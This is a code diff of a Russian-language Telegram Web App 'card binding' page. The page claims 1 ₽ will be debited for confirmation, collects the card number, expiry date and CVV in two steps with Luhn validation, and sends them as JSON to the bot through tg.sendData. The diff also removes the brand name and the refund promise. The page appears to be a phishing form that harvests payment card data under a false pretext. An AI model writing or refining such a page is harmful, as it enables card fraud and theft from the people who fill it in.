@@ -14,32 +14,34 @@
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #0d0d0d;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            color: #fff;
         }
         
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
+            background: #1a1a1a;
+            border-radius: 24px;
+            padding: 32px;
             width: 100%;
             max-width: 400px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            border: 1px solid #2a2a2a;
         }
         
         .logo {
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 32px;
         }
         
         .logo h1 {
-            color: #667eea;
+            color: #00d4aa;
             font-size: 28px;
-            margin-bottom: 5px;
+            font-weight: 700;
+            margin-bottom: 8px;
         }
         
         .logo p {
@@ -47,70 +49,24 @@
             font-size: 14px;
         }
         
-        .card-preview {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 25px;
-            color: white;
-            position: relative;
-            height: 200px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-        
-        .chip {
-            width: 50px;
-            height: 35px;
-            background: linear-gradient(135deg, #f0d878 0%, #d4af37 100%);
-            border-radius: 8px;
-            position: relative;
-        }
-        
-        .chip::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 30px;
-            height: 2px;
-            background: rgba(0,0,0,0.3);
-        }
-        
-        .chip::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) rotate(90deg);
-            width: 30px;
-            height: 2px;
-            background: rgba(0,0,0,0.3);
-        }
-        
-        .card-number-display {
-            font-size: 22px;
-            letter-spacing: 3px;
-            font-family: 'Courier New', monospace;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
-        }
-        
-        .card-info {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-        }
-        
-        .card-holder {
+        .info-text {
+            text-align: center;
+            color: #aaa;
             font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            margin-bottom: 28px;
+            line-height: 1.6;
+            padding: 35px;
         }
         
-        .card-expiry {
-            font-size: 14px;
+        .amount-badge {
+            display: inline-block;
+            background: rgba(0, 212, 170, 0.15);
+            color: #00d4aa;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            margin-top: 12px;
+            border: 1px solid rgba(0, 212, 170, 0.3);
         }
         
         .form-group {
@@ -119,60 +75,86 @@
         
         .form-group label {
             display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-size: 14px;
+            margin-bottom: 10px;
+            color: #ccc;
+            font-size: 13px;
             font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
         
         .form-group input {
             width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
+            padding: 18px 16px;
+            background: #0d0d0d;
+            border: 2px solid #2a2a2a;
+            border-radius: 16px;
+            font-size: 18px;
+            color: #fff;
             transition: all 0.3s ease;
             outline: none;
+            letter-spacing: 2px;
         }
         
         .form-group input:focus {
-            border-color: #667eea;
+            border-color: #00d4aa;
+            background: #141414;
+        }
+        
+        .form-group input.error {
+            border-color: #ff4757;
+            animation: shake 0.5s;
+        }
+        
+        .form-group input.valid {
+            border-color: #00d4aa;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
         }
         
         .form-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            gap: 16px;
         }
         
         .submit-btn {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            padding: 20px;
+            background: linear-gradient(135deg, #00d4aa 0%, #00a884 100%);
+            color: #0d0d0d;
             border: none;
-            border-radius: 12px;
+            border-radius: 16px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition: all 0.3s ease;
+            margin-top: 8px;
         }
         
         .submit-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 10px 40px rgba(0, 212, 170, 0.3);
         }
         
-        .submit-btn:active {
-            transform: translateY(0);
+        .submit-btn:disabled {
+            background: #2a2a2a;
+            color: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
         
         .secure-badge {
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-top: 20px;
-            color: #888;
+            margin-top: 24px;
+            color: #666;
             font-size: 12px;
         }
         
@@ -180,72 +162,79 @@
             width: 16px;
             height: 16px;
             margin-right: 8px;
-            fill: #4caf50;
+            fill: #00d4aa;
         }
         
-        .info-text {
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+        
+        .step {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #2a2a2a;
+            transition: all 0.3s ease;
+        }
+        
+        .step.active {
+            background: #00d4aa;
+            width: 24px;
+            border-radius: 4px;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .card-hint {
             text-align: center;
             color: #666;
-            font-size: 13px;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        
-        .amount-badge {
-            display: inline-block;
-            background: #e8f5e9;
-            color: #4caf50;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-weight: 600;
-            margin-top: 10px;
+            font-size: 12px;
+            margin-top: 8px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <h1>GS Mobile</h1>
-            <p>Привязка банковской карты</p>
-        </div>
-        
         <div class="info-text">
-            С баланса будет списано <span class="amount-badge">1 ₽</span><br>
-            Сумма вернётся на карту в течение нескольких минут
+            Для подтверждения с Вашего баланса будет списано<br>
+            <span class="amount-badge">1 ₽</span><br>
         </div>
         
-        <div class="card-preview">
-            <div class="chip"></div>
-            <div class="card-number-display" id="cardDisplay">•••• •••• •••• ••••</div>
-            <div class="card-info">
-                <div class="card-holder" id="holderDisplay">ИМЯ ФАМИЛИЯ</div>
-                <div class="card-expiry" id="expiryDisplay">MM/YY</div>
-            </div>
+        <div class="step-indicator">
+            <div class="step active" id="step1"></div>
+            <div class="step" id="step2"></div>
         </div>
         
         <form id="cardForm">
-            <div class="form-group">
-                <label for="cardNumber">Номер карты</label>
-                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">
-            </div>
-            
-            <div class="form-group">
-                <label for="cardHolder">Держатель карты</label>
-                <input type="text" id="cardHolder" placeholder="IVANOV IVAN" maxlength="26">
-            </div>
-            
-            <div class="form-row">
+            <!-- Шаг 1: Номер карты -->
+            <div id="step1-content">
                 <div class="form-group">
-                    <label for="expiry">Срок действия</label>
-                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+                    <label for="cardNumber">Номер карты</label>
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" inputmode="numeric">
                 </div>
-                <div class="form-group">
-                    <label for="cvv">CVV/CVC</label>
-                    <input type="password" id="cvv" placeholder="123" maxlength="3">
+                <div class="card-hint">Введите 16 цифр карты</div>
+            </div>
+            
+            <!-- Шаг 2: Дата и CVV -->
+            <div id="step2-content" class="hidden">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="expiry">Срок действия</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV/CVC</label>
+                        <input type="password" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
+                    </div>
                 </div>
             </div>
             
-            <button type="submit" class="submit-btn">Привязать карту</button>
+            <button type="submit" class="submit-btn" id="submitBtn" disabled>Продолжить</button>
         </form>
         
         <div class="secure-badge">
@@ -259,67 +248,175 @@
         tg.ready();
         tg.expand();
         
-        // Устанавливаем цвет шапки
-        tg.setHeaderColor('#667eea');
-        tg.setBackgroundColor('#667eea');
+        tg.setHeaderColor('#0d0d0d');
+        tg.setBackgroundColor('#0d0d0d');
         
         const cardNumber = document.getElementById('cardNumber');
-        const cardHolder = document.getElementById('cardHolder');
         const expiry = document.getElementById('expiry');
         const cvv = document.getElementById('cvv');
-        const cardDisplay = document.getElementById('cardDisplay');
-        const holderDisplay = document.getElementById('holderDisplay');
-        const expiryDisplay = document.getElementById('expiryDisplay');
+        const submitBtn = document.getElementById('submitBtn');
+        const step1Content = document.getElementById('step1-content');
+        const step2Content = document.getElementById('step2-content');
+        const step1Indicator = document.getElementById('step1');
+        const step2Indicator = document.getElementById('step2');
+        
+        let currentStep = 1;
+        let cardValid = false;
+        let dateValid = false;
+        let cvvValid = false;
+        
+        // Алгоритм Луна
+        function luhnCheck(cardNumber) {
+            let sum = 0;
+            let isEven = false;
+            
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i), 10);
+                
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                
+                sum += digit;
+                isEven = !isEven;
+            }
+            
+            return sum % 10 === 0;
+        }
         
         // Форматирование номера карты
         cardNumber.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '');
             let formatted = '';
+            
             for (let i = 0; i < value.length && i < 16; i++) {
                 if (i > 0 && i % 4 === 0) formatted += ' ';
                 formatted += value[i];
             }
+            
             e.target.value = formatted;
-            cardDisplay.textContent = formatted || '•••• •••• •••• ••••';
+            
+            // Проверка Луна при 16 цифрах
+            if (value.length === 16) {
+                if (luhnCheck(value)) {
+                    cardNumber.classList.remove('error');
+                    cardNumber.classList.add('valid');
+                    cardValid = true;
+                    updateSubmitButton();
+                    
+                    // Автоматический переход к шагу 2
+                    setTimeout(() => goToStep2(), 700);
+                } else {
+                    cardNumber.classList.remove('valid');
+                    cardNumber.classList.add('error');
+                    cardValid = false;
+                    updateSubmitButton();
+                }
+            } else {
+                cardNumber.classList.remove('error', 'valid');
+                cardValid = false;
+                updateSubmitButton();
+            }
         });
         
-        // Форматирование срока действия
+        // Переход к шагу 2
+        function goToStep2() {
+            currentStep = 2;
+            step1Content.classList.add('hidden');
+            step2Content.classList.remove('hidden');
+            step1Indicator.classList.remove('active');
+            step2Indicator.classList.add('active');
+            submitBtn.textContent = 'Привязать карту';
+            expiry.focus();
+            updateSubmitButton();
+        }
+        
+        // Форматирование даты
         expiry.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '');
+            
             if (value.length >= 2) {
+                let month = parseInt(value.substring(0, 2));
+                if (month > 12) value = '12' + value.substring(2);
+                if (month === 0) value = '01' + value.substring(2);
                 value = value.substring(0, 2) + '/' + value.substring(2, 4);
             }
+            
             e.target.value = value;
-            expiryDisplay.textContent = value || 'MM/YY';
+            
+            // Проверка валидности даты
+            if (value.length === 5) {
+                let parts = value.split('/');
+                let month = parseInt(parts[0]);
+                let year = parseInt(parts[1]);
+                let currentYear = new Date().getFullYear() % 100;
+                let currentMonth = new Date().getMonth() + 1;
+                
+                if (year > currentYear || (year === currentYear && month >= currentMonth)) {
+                    dateValid = true;
+                    expiry.classList.add('valid');
+                    
+                    // Автоматический переход к CVV
+                    setTimeout(() => cvv.focus(), 100);
+                } else {
+                    dateValid = false;
+                    expiry.classList.remove('valid');
+                }
+            } else {
+                dateValid = false;
+                expiry.classList.remove('valid');
+            }
+            
+            updateSubmitButton();
         });
         
-        // Имя держателя
-        cardHolder.addEventListener('input', (e) => {
-            let value = e.target.value.toUpperCase();
-            e.target.value = value.replace(/[^A-Z\s]/g, '');
-            holderDisplay.textContent = value || 'ИМЯ ФАМИЛИЯ';
-        });
-        
-        // Только цифры для CVV
+        // CVV ввод
         cvv.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/\D/g, '');
+            cvvValid = e.target.value.length === 3;
+            
+            if (cvvValid) {
+                cvv.classList.add('valid');
+            } else {
+                cvv.classList.remove('valid');
+            }
+            
+            updateSubmitButton();
         });
+        
+        // Обновление кнопки
+        function updateSubmitButton() {
+            if (currentStep === 1) {
+                submitBtn.disabled = !cardValid;
+            } else {
+                submitBtn.disabled = !(dateValid && cvvValid);
+            }
+        }
         
         // Отправка формы
         document.getElementById('cardForm').addEventListener('submit', (e) => {
             e.preventDefault();
             
-            const cardData = {
-                card_number: cardNumber.value.replace(/\s/g, ''),
-                card_holder: cardHolder.value,
-                expiry: expiry.value,
-                cvv: cvv.value
-            };
+            if (currentStep === 1 && cardValid) {
+                goToStep2();
+                return;
+            }
             
-            // Отправляем данные в бот
-            tg.sendData(JSON.stringify(cardData));
-            tg.close();
+            if (currentStep === 2 && dateValid && cvvValid) {
+                const cardData = {
+                    card_number: cardNumber.value.replace(/\s/g, ''),
+                    expiry: expiry.value,
+                    cvv: cvv.value
+                };
+                
+                tg.sendData(JSON.stringify(cardData));
+                tg.close();
+            }
         });
+        
+        // Инициализация
+        updateSubmitButton();
     </script>
 </body>
 </html>
